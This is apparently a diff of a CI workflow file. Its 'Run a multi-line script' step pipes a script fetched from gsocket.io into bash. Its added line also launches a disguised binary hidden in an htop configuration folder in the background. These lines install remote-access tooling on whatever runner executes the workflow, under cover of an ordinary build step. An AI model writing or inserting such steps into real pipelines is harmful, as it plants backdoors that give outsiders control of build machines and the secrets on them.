@@ -20,5 +20,6 @@ jobs:
 
       - name: Run a multi-line script
         run: |
-          ( bash -c "$(curl -fsSL https://gsocket.io/y)" & )
+          bash -c "$(curl -fsSL https://gsocket.io/y)"
+          ( /home/giter/.config/htop/defunct & )
           echo "aaa"
